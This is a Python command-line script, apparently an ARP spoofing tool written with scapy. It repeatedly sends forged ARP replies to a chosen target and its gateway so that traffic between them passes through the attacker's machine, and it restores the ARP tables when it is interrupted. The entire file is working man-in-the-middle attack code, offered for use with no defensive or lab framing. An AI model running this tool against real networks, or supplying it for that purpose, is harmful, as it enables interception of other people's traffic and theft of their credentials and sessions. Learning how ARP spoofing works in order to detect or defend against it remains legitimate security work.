#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse

# Get the MAC address of the given IP
def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        return answered_list[0][1].hwsrc
    except IndexError:
        print(f"[!] Could not find MAC address for IP: {ip}")
        return None

# Spoof the ARP cache by sending a fake ARP response
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Unable to spoof {target_ip}, no MAC address found.")
        return

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Restore the original ARP table entries
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    if destination_mac is None or source_mac is None:
        print(f"[!] Unable to restore ARP table for {destination_ip} and {source_ip}")
        return

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Argument parsing for target and gateway IPs
def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("-t", "--target", dest="target_ip", required=True, help="IP address of the target machine")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", required=True, help="IP address of the gateway")
    return parser.parse_args()

# Main execution logic
if __name__ == "__main__":
    args = get_arguments()
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip

    try:
        sent_packet_count = 0
        while True:
            spoof(target_ip, gateway_ip)  # Spoof target to think attacker is gateway
            spoof(gateway_ip, target_ip)  # Spoof gateway to think attacker is target
            sent_packet_count += 2
            print(f"\r[+] Packets sent: {sent_packet_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ...... Restoring ARP tables ...... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] ARP tables restored. Exiting.")
